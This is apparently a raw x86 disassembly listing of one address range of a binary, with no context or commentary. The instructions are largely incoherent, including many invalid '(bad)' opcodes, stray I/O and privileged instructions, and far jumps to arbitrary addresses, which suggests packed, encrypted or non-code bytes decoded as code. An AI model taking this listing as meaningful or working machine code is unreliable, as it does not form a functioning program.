  41555e:	jno    0x4154e0
  415560:	retf   
  415561:	popa   
  415562:	(bad)  
  415563:	xor    ebx,DWORD PTR [edi+ebx*2-0x73]
  415567:	in     al,0x7c
  415569:	pop    ecx
  41556a:	test   ecx,0x16c15468
  415570:	add    al,0x7a
  415572:	jnp    0x4155f2
  415574:	or     DWORD PTR [edx-0x1a],eax
  415577:	mov    ecx,0xcf91c3d4
  41557c:	dec    esp
  41557d:	sbb    al,0x65
  41557f:	mov    eax,ds:0xc10c3847
  415584:	jnp    0x415517
  415586:	dec    ebx
  415587:	mov    WORD PTR [eax+0x471829c],?
  41558d:	jl     0x4155f7
  41558f:	or     DWORD PTR [ecx-0x49bbc7cf],edi
  415595:	mov    BYTE PTR [ebx+esi*2],ch
  415598:	int    0x7e
  41559a:	sub    ch,BYTE PTR [esi-0x6e64e1ca]
  4155a0:	iret   
  4155a1:	xchg   ebp,eax
  4155a2:	push   esi
  4155a3:	add    eax,0xdeef241
  4155a8:	xor    eax,0xf4b6693d
  4155ad:	icebp  
  4155ae:	jae    0x4155bf
  4155b0:	pop    esi
  4155b1:	lea    eax,[eax+0x27]
  4155b4:	inc    ecx
  4155b5:	or     BYTE PTR ds:0xcbb2d9d7,ch
  4155bb:	popf   
  4155bc:	scas   eax,DWORD PTR es:[edi]
  4155bd:	pop    edx
  4155be:	xor    bh,BYTE PTR [eax+ebp*2-0x6b972950]
  4155c5:	push   ebp
  4155c6:	inc    eax
  4155c7:	pushf  
  4155c8:	mov    bh,0xf7
  4155ca:	jp     0x41560f
  4155cc:	data16 sbb al,0x6d
  4155cf:	retf   0xf554
  4155d2:	shl    DWORD PTR [eax+0x161f2403],cl
  4155d8:	jge    0x415604
  4155da:	push   cs
  4155db:	dec    ebp
  4155dc:	les    edi,FWORD PTR [esi]
  4155de:	push   edx
  4155df:	jb     0x415562
  4155e1:	aas    
  4155e2:	jg     0x415571
  4155e4:	push   esi
  4155e5:	cdq    
  4155e6:	ins    BYTE PTR es:[edi],dx
  4155e7:	dec    edx
  4155e8:	in     al,0x7a
  4155ea:	jge    0x4155db
  4155ec:	ss mov dl,0x66
  4155ef:	scas   eax,DWORD PTR es:[edi]
  4155f0:	pop    ss
  4155f1:	and    DWORD PTR [edx+0x5c7918fb],edi
  4155f7:	mov    dh,ah
  4155f9:	or     al,0xb1
  4155fb:	xor    BYTE PTR [ebx+0x3548c012],dh
  415601:	mov    bh,al
  415603:	pop    ds
  415604:	jae    0x415683
  415606:	in     eax,0x3f
  415608:	xchg   esi,eax
  415609:	mov    edi,0xff3c29f
  41560e:	or     al,0xd
  415610:	jb     0x4155c1
  415612:	ror    DWORD PTR [edx],0xa1
  415615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415616:	loop   0x4155d6
  415618:	out    0xb7,eax
  41561a:	test   al,0x65
  41561c:	jne    0x41565b
  41561e:	jb     0x4155a4
  415620:	dec    edi
  415621:	add    ebx,esi
  415623:	push   esp
  415624:	xlat   BYTE PTR ds:[ebx]
  415625:	mov    BYTE PTR [ecx],al
  415627:	aas    
  415628:	mov    ?,eax
  41562a:	sbb    BYTE PTR [ebp-0xe86bf42],0x7e
  415631:	push   ds
  415632:	mov    cs,WORD PTR [di-0x921]
  415637:	and    bl,BYTE PTR [edx]
  415639:	add    al,0x6d
  41563b:	fidivr WORD PTR [eax]
  41563d:	ffree  st(1)
  41563f:	xchg   edx,eax
  415640:	add    BYTE PTR [edi],cl
  415642:	(bad)  
  415644:	sub    eax,DWORD PTR [edi-0x8]
  415647:	jmp    0x4156b3
  415649:	and    DWORD PTR [ebp+0x64],0x428aa25e
  415650:	in     eax,0xd4
  415652:	pusha  
  415653:	nop
  415654:	ins    BYTE PTR es:[edi],dx
  415655:	jecxz  0x41562f
  415657:	and    edi,esi
  415659:	jne    0x415657
  41565b:	popa   
  41565c:	jmp    0xe282b780
  415661:	inc    ecx
  415662:	mov    dh,BYTE PTR [eax]
  415664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415665:	in     eax,dx
  415666:	ror    ch,0x2f
  415669:	inc    ebp
  41566a:	or     al,0x7d
  41566c:	and    eax,0xe3e82e63
  415671:	mov    ecx,0xa8822de0
  415676:	addr16 add bh,bl
  415679:	inc    ebp
  41567a:	cmp    BYTE PTR [ecx+0x2adbd4e6],al
  415680:	shl    BYTE PTR [ebp-0x67],cl
  415683:	or     DWORD PTR [edx-0x738c83e4],ebp
  415689:	sbb    ch,BYTE PTR [ebp-0x5819f5c6]
  41568f:	push   edx
  415690:	retf   
  415691:	mov    bl,0xd6
  415693:	popf   
  415694:	rcr    DWORD PTR [edi+0x36],1
  415697:	or     BYTE PTR ds:0x28f563ea,dl
  41569d:	dec    eax
  41569e:	mov    DWORD PTR [edi+0x6c163015],ecx
  4156a4:	or     edx,DWORD PTR [ebp-0x4b381363]
  4156aa:	retf   
  4156ab:	xchg   edi,eax
  4156ac:	in     eax,dx
  4156ad:	pop    esi
  4156ae:	fadd   QWORD PTR [ebp-0x317311fd]
  4156b4:	xor    cl,BYTE PTR [eax+0x80fddf2]
  4156ba:	mov    cl,0xaf
  4156bc:	retf   
  4156bd:	(bad)  
  4156be:	(bad)  
  4156c0:	jns    0x415727
  4156c2:	fwait
  4156c3:	dec    eax
  4156c4:	bound  ebp,QWORD PTR [edi]
  4156c6:	xor    DWORD PTR [eax-0x2749393f],ecx
  4156cc:	out    0xd9,al
  4156ce:	or     BYTE PTR [eax],0xd9
  4156d1:	mov    bh,0x47
  4156d3:	in     al,0xe0
  4156d5:	sub    ecx,DWORD PTR [esi+ebp*4-0x7789ebb1]
  4156dc:	push   edi
  4156dd:	imul   edi,DWORD PTR [edx],0x35
  4156e0:	outs   dx,BYTE PTR ds:[esi]
  4156e1:	jno    0x41566e
  4156e3:	es inc esi
  4156e5:	xchg   DWORD PTR [esi+0x32d8bd56],ebp
  4156eb:	popf   
  4156ec:	push   cs
  4156ed:	sti    
  4156ee:	popa   
  4156ef:	jle    0x4156f0
  4156f1:	scas   eax,DWORD PTR es:[edi]
  4156f2:	mov    ds:0x81e2f207,al
  4156f7:	or     eax,0x99bb1bd2
  4156fc:	jecxz  0x41570f
  4156fe:	popa   
  4156ff:	sub    al,0xfb
  415701:	mov    dh,0x8
  415703:	jne    0x41570b
  415705:	add    eax,0x4cb5b563
  41570a:	(bad)  
  41570b:	mov    edi,DWORD PTR [ebp-0x61d5d829]
  415711:	push   es
  415712:	push   eax
  415713:	in     eax,0xb
  415715:	and    DWORD PTR [ebx],edi
  415717:	mov    esi,0x4ab8451a
  41571c:	fs loopne 0x4156cc
  41571f:	inc    ebx
  415720:	fistp  QWORD PTR ss:[edx-0x1e]
  415724:	imul   esi,DWORD PTR [ecx+ecx*1],0x5928e39d
  41572b:	call   0x105a:0x3acaa204
  415732:	hlt    
  415733:	rol    bh,0xd6
  415736:	fmul   DWORD PTR ds:0x3d2eedcf
  41573c:	ss cmp al,0x97
  41573f:	leave  
  415740:	aam    0xfe
  415742:	xchg   edx,eax
  415743:	cdq    
  415744:	pop    edx
  415745:	jb     0x4157b3
  415747:	push   edx
  415748:	cmp    DWORD PTR [esi-0xa34f80c],0xffffff88
  41574f:	or     DWORD PTR [edi+edx*8],edi
  415752:	shr    BYTE PTR [edi+eiz*8],cl
  415755:	fisub  DWORD PTR [edx-0x243e0839]
  41575b:	fadd   QWORD PTR [edx-0x5ad48539]
  415761:	mov    ebp,ds
  415763:	cwde   
  415764:	push   edx
  415765:	push   esi
  415766:	cmp    al,0x6f
  415768:	hlt    
  415769:	inc    ecx
  41576a:	outs   dx,BYTE PTR ds:[esi]
  41576b:	in     eax,dx
  41576c:	rcr    DWORD PTR ds:0xf79e55b3,1
  415772:	dec    eax
  415773:	xchg   edx,eax
  415774:	out    0x38,eax
  415776:	add    eax,0x91520042
  41577b:	test   edi,ebp
  41577d:	enter  0xf4db,0x7d
  415781:	mov    esi,0xebae4639
  415786:	adc    eax,eax
  415788:	adc    al,BYTE PTR [eax-0x3f]
  41578b:	or     al,0xd7
  41578d:	mov    edx,0x2b06c0a
  415792:	call   0x567d:0xd71dfe05
  415799:	jns    0x4157f6
  41579b:	push   es
  41579c:	les    ebx,FWORD PTR [edx-0x34]
  41579f:	xor    eax,DWORD PTR [edx+0x1f8ddd54]
  4157a5:	mov    bl,BYTE PTR [esi]
  4157a7:	mov    WORD PTR [edx],ss
  4157a9:	adc    BYTE PTR [edi],bl
  4157ab:	aaa    
  4157ac:	or     ecx,ecx
  4157ae:	enter  0xa69a,0x4e
  4157b2:	out    0x67,eax
  4157b4:	retf   0x4751
  4157b7:	dec    esi
  4157b8:	xor    esp,DWORD PTR [eax]
  4157ba:	mov    ds:0xb66b463e,eax
  4157bf:	push   ss
  4157c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157c1:	xor    eax,0xcd96b976
  4157c6:	and    bh,ch
  4157c8:	cmovl  ecx,DWORD PTR [edx]
  4157cb:	smsw   WORD PTR [edx+0x35]
  4157cf:	and    DWORD PTR [edx+0x11],esi
  4157d2:	push   0xffffffc1
  4157d4:	mov    ch,0x5d
  4157d6:	xchg   BYTE PTR [ecx-0x5d],dh
  4157d9:	push   eax
  4157da:	mov    edi,0xf326ca8
  4157df:	inc    esp
  4157e0:	fimul  WORD PTR [edi-0x52]
  4157e3:	outs   dx,DWORD PTR ds:[esi]
  4157e4:	dec    esp
  4157e5:	mov    ds:0x17bf6662,eax
  4157ea:	test   eax,0x3bd35bb8
  4157ef:	clc    
  4157f0:	std    
  4157f1:	and    ch,BYTE PTR [ebx-0x51]
  4157f4:	push   edx
  4157f5:	inc    esp
  4157f6:	pop    ecx
  4157f7:	mov    BYTE PTR [ebx-0x53],ch
  4157fa:	xchg   esi,eax
  4157fb:	xor    BYTE PTR [esi-0x3f],cl
  4157fe:	pop    esi
  4157ff:	ss dec esp
  415801:	push   cs
  415802:	push   edi
  415803:	test   al,0x61
  415805:	outs   dx,BYTE PTR ds:[esi]
  415806:	jnp    0x415873
  415808:	jmp    0x6051b86b
  41580d:	mov    al,ds:0x2a080a42
  415812:	push   ds
  415813:	std    
  415814:	shl    DWORD PTR [esi],cl
  415816:	ret    
  415817:	sub    DWORD PTR [edi+ebp*8-0x2d9cf84c],esi
  41581e:	ror    BYTE PTR [edi],1
  415820:	push   ebp
  415821:	clc    
  415822:	clc    
  415823:	lods   eax,DWORD PTR ds:[esi]
  415824:	and    ebx,ecx
  415826:	xor    esp,ebp
  415828:	jnp    0x4157c0
  41582a:	pop    esp
  41582b:	dec    edx
  41582c:	pop    ebx
  41582d:	aam    0xdb
  41582f:	or     DWORD PTR [edi+0x4c],ebx
  415832:	jecxz  0x415853
  415834:	sub    ch,BYTE PTR [ebp+0x5a]
  415837:	xchg   ebx,eax
  415838:	rcr    BYTE PTR [esi+0x400c105a],0x9b
  41583f:	mov    BYTE PTR [ebx+0x73143d23],al
  415845:	dec    edi
  415846:	pop    es
  415847:	xor    bl,BYTE PTR [esi]
  415849:	jg     0x415899
  41584b:	icebp  
  41584c:	int    0xf3
  41584e:	cmp    DWORD PTR [esi-0x73edc084],edi
  415854:	dec    edi
  415855:	daa    
  415856:	dec    ebp
  415857:	xor    dl,al
  415859:	sbb    bl,BYTE PTR [edx]
  41585b:	fmul   DWORD PTR [esi+ebp*8+0xad6fb89]
  415862:	push   ecx
  415863:	in     al,dx
  415864:	add    al,0xbd
  415866:	or     BYTE PTR [edx-0x8],al
  415869:	adc    esp,DWORD PTR [eax-0x4715faf6]
  41586f:	test   eax,0x45105526
  415874:	fwait
  415875:	popa   
  415876:	clc    
  415877:	xchg   BYTE PTR [ecx+edx*2+0x3b370ec7],al
  41587e:	sbb    BYTE PTR [eax+ebp*4+0x1e5eefdb],dl
  415885:	or     al,0xd
  415887:	pop    eax
  415888:	das    
  415889:	mov    DWORD PTR [eax-0x58],ebp
  41588c:	or     DWORD PTR [ebp+0x6f],edx
  41588f:	pop    es
  415890:	sbb    BYTE PTR [edx+0x16],dl
  415893:	jno    0x415869
  415895:	aad    0x12
  415897:	xor    eax,DWORD PTR ds:0x30629006
  41589d:	sub    DWORD PTR [edi-0x32af2bf3],ebp
  4158a3:	bnd ret 
  4158a5:	aad    0xd8
  4158a7:	call   0xffe9:0x17d5cc76
  4158ae:	fisubr WORD PTR ds:0x96b44a54
  4158b4:	push   edi
  4158b5:	inc    edi
  4158b6:	outs   dx,BYTE PTR ds:[esi]
  4158b7:	sub    eax,0xd641b8ad
  4158bc:	adc    eax,0xa7ed0132
  4158c1:	push   cs
  4158c2:	sub    dl,BYTE PTR [esi-0x344d0dae]
  4158c8:	mov    ch,0x5b
  4158ca:	mov    esi,0x4fc524e5
  4158cf:	sub    eax,0x6ed3cc71
  4158d4:	fs test eax,0x6e152406
  4158da:	cmp    BYTE PTR [eax],ch
  4158dc:	mov    ah,0x3d
  4158de:	ja     0x415902
  4158e0:	jmp    0xcd8bcf22
  4158e5:	pop    edi
  4158e6:	push   eax
  4158e7:	push   edx
  4158e8:	sub    dl,bl
  4158ea:	imul   esp,eax,0x2b
  4158ed:	or     DWORD PTR [esi+0x1a50fa9f],ebx
  4158f3:	dec    eax
  4158f4:	add    BYTE PTR [eax-0x7f],bh
  4158f7:	sub    bh,bl
  4158f9:	test   BYTE PTR [esi-0x136baad9],0x8f
  415900:	loop   0x4158be
  415902:	outs   dx,BYTE PTR ds:[esi]
  415903:	data16 hlt 
  415905:	loope  0x41597d
  415907:	ins    BYTE PTR es:[edi],dx
  415908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415909:	adc    BYTE PTR [eax+edi*2],0x51
  41590d:	pop    ebp
  41590e:	cmp    eax,0x3bd815ca
  415913:	xor    edi,DWORD PTR ss:[edi+ebp*1]
  415917:	call   0x1fda:0x27eee42c
  41591e:	ffree  st(5)
  415920:	mov    BYTE PTR [esi-0x24582349],bl
  415926:	adc    ah,0xe4
  415929:	push   edi
  41592a:	bswap  ebp
  41592c:	sub    eax,0xe8a589bf
  415931:	mov    dl,BYTE PTR [esi]
  415933:	xchg   ebx,eax
  415934:	xor    al,0xf0
  415936:	mov    ds,WORD PTR [ecx+eiz*8+0x48]
  41593a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41593b:	mov    edx,0xce748ddd
  415940:	dec    esi
  415941:	shl    DWORD PTR [ecx-0x449b216c],1
  415947:	and    al,0x52
  415949:	shr    dh,cl
  41594b:	mov    bl,0xf3
  41594d:	pusha  
  41594e:	and    ebp,ebp
  415950:	fsubr  QWORD PTR [ebx]
  415952:	sbb    BYTE PTR [ebp+0x6e],al
  415955:	stos   DWORD PTR es:[edi],eax
  415956:	aaa    
  415957:	sbb    eax,0x6a185511
  41595c:	pop    ebx
  41595d:	aam    0x8d
  41595f:	push   ss
  415960:	push   ss
  415961:	dec    eax
  415962:	je     0x415959
  415964:	or     ecx,eax
  415966:	call   0x9b10ecde
  41596b:	in     al,0xb8
  41596d:	out    0x4a,eax
  41596f:	pop    ebx
  415970:	iret   
  415971:	xor    BYTE PTR [edi-0x210d6dd8],dh
  415977:	pop    esp
  415978:	sti    
  415979:	outs   dx,DWORD PTR ds:[esi]
  41597a:	mov    dh,0xc9
  41597c:	pop    edx
  41597d:	inc    edx
  41597e:	aaa    
  41597f:	ins    DWORD PTR es:[edi],dx
  415980:	inc    esp
  415981:	jbe    0x4159e0
  415983:	add    BYTE PTR [esp+edi*8-0x77],ch
  415987:	mov    al,ds:0x106b7927
  41598c:	add    DWORD PTR [esi-0x43fb1970],ebp
  415992:	jmp    0xd7c3:0x67656a45
  415999:	jmp    0xb15282b5
  41599e:	clc    
  41599f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159a0:	cmp    eax,0x7ba6a9db
  4159a5:	adc    dh,al
  4159a7:	pushf  
  4159a8:	jns    0x4159fe
  4159aa:	nop
  4159ab:	sbb    eax,DWORD PTR [edx+0x690dcae4]
  4159b1:	dec    esi
  4159b2:	mov    edi,0xa75ad3c3
  4159b7:	jmp    0xec17:0xd3c4f77f
  4159be:	aas    
  4159bf:	ins    DWORD PTR es:[edi],dx
  4159c0:	xchg   ebp,eax
  4159c1:	lods   al,BYTE PTR fs:[esi]
  4159c3:	mov    al,0x10
  4159c5:	dec    ecx
  4159c6:	xchg   ecx,eax
  4159c7:	std    
  4159c8:	xlat   BYTE PTR ds:[ebx]
  4159c9:	mov    ecx,0x9455f667
  4159ce:	ret    0xa952
  4159d1:	sub    al,0x50
  4159d3:	xor    al,0x76
  4159d5:	sub    ch,0xe6
  4159d8:	mov    edi,0x9a201ae9
  4159dd:	mov    al,ds:0x4c906654
  4159e2:	jge    0x4159a6
  4159e4:	xor    edi,DWORD PTR [ecx+0x5b]
  4159e7:	mov    dl,0x4f
  4159e9:	jge    0x41598e
  4159eb:	fcomp  DWORD PTR [ebp+0x3d5bb1b1]
  4159f1:	jle    0x415a0f
  4159f3:	pusha  
  4159f4:	imul   edx,DWORD PTR [esp+eax*2+0x6ba8d64b],0xffffff99
  4159fc:	sub    dl,BYTE PTR [edx]
  4159fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159ff:	mov    edx,0x6c8cd580
  415a04:	and    al,0xf8
  415a06:	int3   
  415a07:	jge    0x415a70
  415a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a0a:	jecxz  0x4159ba
  415a0c:	jbe    0x415a36
  415a0e:	stos   DWORD PTR es:[edi],eax
  415a0f:	push   esi
  415a10:	cmp    DWORD PTR [ebp+0x48cb8e5f],esp
  415a16:	cmp    al,0xb
  415a18:	push   es
  415a19:	push   0xffffffc6
  415a1b:	ins    DWORD PTR es:[edi],dx
  415a1c:	pop    ds
  415a1d:	leave  
  415a1e:	inc    eax
  415a1f:	or     DWORD PTR [ebp-0x22],0x532c9dec
  415a26:	scas   eax,DWORD PTR es:[edi]
  415a27:	ror    DWORD PTR [eax+eax*4-0x794caddc],1
  415a2e:	fs int3 
  415a30:	aad    0x8a
  415a32:	pop    ds
  415a33:	push   esp
  415a34:	add    al,0xe0
  415a36:	js     0x415a97
  415a38:	int    0xd4
  415a3a:	xchg   ah,bl
  415a3c:	cs inc edi
  415a3e:	pushf  
  415a3f:	sti    
  415a40:	fidivr WORD PTR [ecx-0x39]
  415a43:	inc    ebx
  415a44:	je     0x415abd
  415a46:	pop    ds
  415a47:	cmc    
  415a48:	ror    BYTE PTR [ecx],0x9a
  415a4b:	je     0x415a57
  415a4d:	xchg   ecx,eax
  415a4e:	aam    0xde
  415a50:	cmp    ebx,DWORD PTR [edi+0x291fe3cd]
  415a56:	mov    ch,BYTE PTR [ebx-0xdcbf37c]
  415a5c:	add    DWORD PTR [edx+0x4e0b8e7f],edi
  415a62:	push   edi
  415a63:	push   ebp
  415a64:	mov    bh,0x55
  415a66:	and    edi,eax
  415a68:	and    edx,DWORD PTR [edx]
  415a6a:	jno    0x415ab8
  415a6c:	rol    dl,cl
  415a6e:	ds stos DWORD PTR es:[edi],eax
  415a70:	mov    eax,ds:0xbfbf5361
  415a75:	push   ecx
  415a76:	pop    esp
  415a77:	and    eax,0x563fb563
  415a7c:	sub    al,0x65
  415a7e:	push   ds
  415a7f:	adc    BYTE PTR [edi+0x23],dh
  415a82:	mov    ebx,0x587f9d7
  415a87:	add    DWORD PTR [ecx+0x1f],ebx
  415a8a:	mov    edi,0xd541c556
  415a8f:	adc    DWORD PTR [edi+ebx*2-0x7b],0xb7c4b00a
  415a97:	inc    esi
  415a98:	dec    edx
  415a99:	xchg   ebp,eax
  415a9a:	(bad)  
  415a9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a9c:	mov    dh,0xa3
  415a9e:	xchg   edi,eax
  415a9f:	ds push edx
  415aa1:	imul   BYTE PTR [ecx]
  415aa3:	jae    0x415ab0
  415aa5:	push   es
  415aa6:	push   0x1b
  415aa8:	xchg   DWORD PTR [eax+0x47dd520d],ecx
  415aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aaf:	push   ecx
  415ab0:	xlat   BYTE PTR ds:[ebx]
  415ab1:	lods   eax,DWORD PTR ds:[esi]
  415ab2:	add    DWORD PTR [edi-0x14],ecx
  415ab5:	xor    ebp,DWORD PTR [ebx+0x39]
  415ab8:	add    ebp,DWORD PTR [ebx]
  415aba:	mov    ch,0x6d
  415abc:	sar    DWORD PTR [eax-0x7cfea888],cl
  415ac2:	sar    DWORD PTR [edi],cl
  415ac4:	aam    0x95
  415ac6:	fst    DWORD PTR [eax]
  415ac8:	jnp    0x415b09
  415aca:	push   0x60
  415acc:	push   es
  415acd:	test   al,0x4d
  415acf:	mov    ecx,0xe8f4bba7
  415ad4:	and    al,0xeb
  415ad6:	fild   WORD PTR [ecx+0x31]
  415ad9:	push   cs
  415ada:	out    dx,al
  415adb:	dec    ebp
  415adc:	and    al,0x73
  415ade:	ret    
  415adf:	std    
  415ae0:	enter  0x57a2,0x14
  415ae4:	and    dl,BYTE PTR [edx+0x6b4ebe63]
  415aea:	xchg   BYTE PTR [esi+0x3d7e53e0],dh
  415af0:	out    0x5f,eax
  415af2:	pushf  
  415af3:	bound  eax,QWORD PTR ds:0xcf365d0
  415af9:	int    0xb5
  415afb:	into   
  415afc:	ficomp WORD PTR [ecx+0x327d7138]
  415b02:	neg    DWORD PTR [edi]
  415b04:	cli    
  415b05:	xlat   BYTE PTR es:[ebx]
  415b07:	test   DWORD PTR [ebp+0x6ffe8483],edi
  415b0d:	fistp  WORD PTR [ecx+0x79b4b1f9]
  415b13:	aad    0xba
  415b15:	adc    esp,DWORD PTR [edi-0x79]
  415b18:	pop    ecx
  415b19:	jmp    FWORD PTR [esi+0x77]
  415b1c:	scas   eax,DWORD PTR es:[edi]
  415b1d:	mov    ecx,0x900ecdc2
  415b22:	addr16 push ecx
  415b24:	dec    ecx
  415b25:	push   esi
  415b26:	out    dx,al
  415b27:	pop    edi
  415b28:	or     BYTE PTR [edi-0xf],ah
  415b2b:	or     eax,edi
  415b2d:	add    DWORD PTR [eax-0x23],esi
  415b30:	cmp    ah,BYTE PTR [eax+0x60]
  415b33:	and    al,0x91
  415b35:	inc    ebx
  415b36:	pop    ds
  415b37:	adc    esi,DWORD PTR [esi-0x3cd3c44d]
  415b3d:	sbb    edi,edx
  415b3f:	sbb    al,0xc9
  415b41:	sar    BYTE PTR [edx-0x58],cl
  415b44:	ror    DWORD PTR [edi],0x91
  415b47:	stc    
  415b48:	pushf  
  415b49:	adc    dh,BYTE PTR [ecx-0x27f25a7c]
  415b4f:	lods   eax,DWORD PTR ds:[esi]
  415b50:	pop    es
  415b51:	mov    ch,BYTE PTR [ebx]
  415b53:	fs pop edi
  415b55:	and    al,0x43
  415b57:	fwait
  415b58:	pop    ds
  415b59:	jno    0x415ae2
  415b5b:	outs   dx,DWORD PTR ds:[esi]
  415b5c:	cmp    ecx,DWORD PTR [ebp-0x446144b9]
  415b62:	sub    ecx,DWORD PTR [ebx+0x14]
  415b65:	sahf   
  415b66:	push   edi
  415b68:	pop    ebx
  415b69:	jne    0x415bda
  415b6b:	cli    
  415b6c:	adc    dh,BYTE PTR [ecx]
  415b6e:	ret    
  415b6f:	add    BYTE PTR [ebx],dl
  415b71:	cdq    
  415b72:	dec    ebp
  415b73:	fdivr  st,st(2)
  415b75:	in     al,0x7a
  415b77:	les    ebx,FWORD PTR [ecx-0x30be9af1]
  415b7d:	arpl   bx,di
  415b7f:	dec    ebx
  415b80:	mov    ds:0xe2a33f1d,al
  415b85:	add    eax,0xd0411a8e
  415b8a:	mov    ds:0xde3f3ff2,al
  415b8f:	sbb    BYTE PTR [ebx+0x501fda54],ch
  415b95:	call   0xb55a:0xad40034b
  415b9c:	inc    ebx
  415b9d:	mov    esp,0x826743e
  415ba2:	adc    DWORD PTR [ebp-0x52],esi
  415ba5:	shl    BYTE PTR [edi+0x79],0x5e
  415ba9:	leave  
  415baa:	cmp    DWORD PTR [edi-0x3a3908c7],edx
  415bb0:	(bad)
  415bb3:	(bad)  
  415bb4:	inc    ebp
  415bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bb6:	add    edi,DWORD PTR [esi+0x38858d0]
  415bbc:	stc    
  415bbd:	pop    ebp
  415bbe:	inc    esi
  415bbf:	std    
  415bc0:	jg     0x415bd6
  415bc2:	adc    eax,0xc313c09b
  415bc7:	or     eax,0xc7064f
  415bcc:	pop    ecx
  415bcd:	ffree  st(1)
  415bcf:	xor    al,0x48
  415bd1:	push   ss
  415bd2:	shl    BYTE PTR [ebp+0x74],1
  415bd5:	les    ebp,FWORD PTR [ebp+0x59405be4]
  415bdb:	cs pusha 
  415bdd:	push   0xb2a3147a
  415be2:	jmp    0x3cd05c85
  415be7:	stc    
  415be8:	push   ss
  415be9:	sar    ebp,cl
  415beb:	sub    bh,BYTE PTR [edi-0x80]
  415bee:	aaa    
  415bef:	pop    ecx
  415bf0:	gs loop 0x415bb5
  415bf3:	jmp    0x415bd1
  415bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bf6:	sub    ecx,DWORD PTR [edi+0x3a]
  415bf9:	fimul  WORD PTR [edi]
  415bfb:	rol    DWORD PTR [esp+edi*2+0x294c6bf7],cl
  415c02:	pop    ds
  415c03:	xchg   edi,eax
  415c04:	jnp    0x415b96
  415c06:	xchg   BYTE PTR [edx],bl
  415c08:	fs stos BYTE PTR es:[edi],al
  415c0a:	cld    
  415c0b:	imul   ecx,DWORD PTR [ebx],0x20
  415c0e:	xor    al,0x39
  415c10:	mov    bl,0x68
  415c12:	or     al,BYTE PTR [ebx-0x3]
  415c15:	mov    bl,0xc8
  415c17:	aam    0x21
  415c19:	nop
  415c1a:	mov    edx,0xd20f1736
  415c1f:	popa   
  415c20:	jne    0x415c61
  415c22:	js     0x415c25
  415c24:	mov    ?,WORD PTR [edi+0x539ec39f]
  415c2a:	pop    ecx
  415c2b:	loopne 0x415c13
  415c2d:	cs (bad) 
  415c2f:	jno    0x415c18
  415c31:	pop    ebx
  415c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c33:	sti    
  415c34:	outs   dx,DWORD PTR ds:[esi]
  415c35:	clc    
  415c36:	push   ds
  415c37:	inc    edi
  415c38:	movq   mm3,mm1
  415c3b:	pop    edx
  415c3c:	sbb    ebp,DWORD PTR [edx]
  415c3e:	mov    bh,BYTE PTR [esp+edi*8-0x1c17f582]
  415c45:	mov    edi,0x9ba81a8f
  415c4a:	mov    ss,WORD PTR [edx-0xfa52453]
  415c50:	sbb    dl,ah
  415c52:	test   al,0xb4
  415c54:	fcom   DWORD PTR ds:0xb9c80b76
  415c5a:	push   ds
  415c5b:	or     eax,DWORD PTR [ebp-0x73]
  415c5e:	lods   eax,DWORD PTR ds:[esi]
  415c5f:	data16 fdiv DWORD PTR [esp+esi*1]
  415c63:	shl    DWORD PTR ds:0x40710593,0xfb
  415c6a:	xor    al,BYTE PTR [edi+ebx*2+0x5f08574]
  415c71:	sub    DWORD PTR [ecx+0x2f],esi
  415c74:	mov    ds:0x81bc6806,eax
  415c79:	popa   
  415c7a:	lea    ebp,[edi+0x11875d33]
  415c80:	inc    edi
  415c81:	test   al,0xa7
  415c83:	jge    0x415cd1
  415c85:	loopne 0x415c14
  415c87:	test   eax,0xad5f0a37
  415c8c:	dec    edi
  415c8d:	arpl   WORD PTR [edx],ax
  415c8f:	xor    al,0x2a
  415c91:	test   BYTE PTR ds:0x29fa98d9,dl
  415c97:	das    
  415c98:	add    DWORD PTR [eax],ebp
  415c9a:	mov    DWORD PTR [edi-0x74],ebx
  415c9d:	mov    dh,0x1c
  415c9f:	idiv   DWORD PTR [eax-0x5e]
  415ca2:	call   0x453aca41
  415ca7:	shl    al,cl
  415ca9:	cmp    DWORD PTR [eax],0xffffff9b
  415cac:	rcr    dl,0xad
  415caf:	pop    es
  415cb0:	and    ah,BYTE PTR [edi+0x5c]
  415cb3:	daa    
  415cb4:	daa    
  415cb5:	or     eax,0xa1159d19
  415cba:	xor    eax,0xe8c3f40e
  415cbf:	cmp    al,0x6c
  415cc1:	(bad)  
  415cc2:	xor    eax,0xa8c1ad6f
  415cc7:	jl     0x415cbc
  415cc9:	fiadd  WORD PTR [eax]
  415ccb:	std    
  415ccc:	mov    ds:0xc91eb90e,eax
  415cd1:	or     al,0x1a
  415cd3:	pop    ss
  415cd4:	inc    esi
  415cd5:	call   0xf5b9:0x65ca0541
  415cdc:	inc    edx
  415cdd:	mov    ah,0x49
  415cdf:	xor    al,0x5e
  415ce1:	fadd   DWORD PTR [esi-0x5b591d33]
  415ce7:	aam    0xa8
  415ce9:	inc    esi
  415cea:	push   ebp
  415ceb:	xchg   ebx,eax
  415cec:	rcr    BYTE PTR [edx-0xc],cl
  415cef:	rcr    edi,cl
  415cf1:	das    
  415cf2:	jae    0x415c8d
  415cf4:	int    0x26
  415cf6:	fcom   DWORD PTR [ebx-0x79]
  415cf9:	mov    dh,0x67
  415cfb:	test   DWORD PTR [eax-0x26],ecx
  415cfe:	jo     0x415d40
  415d00:	je     0x415c8a
  415d02:	test   BYTE PTR [edx+0x70],0xae
  415d06:	adc    eax,0x216c6491
  415d0b:	in     eax,dx
  415d0c:	test   al,0x21
  415d0e:	dec    eax
  415d0f:	stc    
  415d10:	mov    ecx,0x8847e03d
  415d15:	xchg   ebp,eax
  415d16:	dec    edx
  415d17:	add    DWORD PTR [ebp+0x5e],eax
  415d1a:	(bad)  
  415d1b:	aaa    
  415d1c:	dec    ecx
  415d1d:	mov    edi,0x8079d9c6
  415d22:	bound  edi,QWORD PTR [esi+0x2bde56b2]
  415d28:	mov    DWORD PTR [edi-0x4a42ea5],ebx
